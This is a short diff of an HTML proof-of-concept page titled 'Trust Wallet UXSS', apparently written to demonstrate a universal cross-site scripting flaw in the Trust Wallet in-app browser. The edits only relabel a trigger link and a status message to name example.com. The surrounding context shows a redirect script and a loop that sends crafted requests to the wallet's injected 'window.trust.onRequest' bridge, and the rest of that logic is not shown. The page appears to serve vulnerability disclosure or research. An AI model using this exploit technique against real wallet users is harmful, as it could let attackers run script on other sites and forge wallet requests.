@@ -3,7 +3,7 @@
 <meta charset="utf-8">
 <title>Trust Wallet UXSS</title>
 </head><body>
-<a id="run" href="https://trustwallet.com/">Trigger UXSS</a>
+<a id="run" href="https://trustwallet.com/">Trigger UXSS on example.com</a>
 <pre id="status"></pre>
 <script>
   location="http://google.com:83"
@@ -62,9 +62,9 @@ runLink.addEventListener('click', (event) => {
   }
   if (!armed) {
     armed = true;
-    status.textContent = 'Navigating to …';
+    status.textContent = 'Navigating to example.com…';
     window.addEventListener('pagehide', () => {
-  
+    
       for (let i = 0; i < 12; i++) {
         try {
           window.trust.onRequest(JSON.stringify({
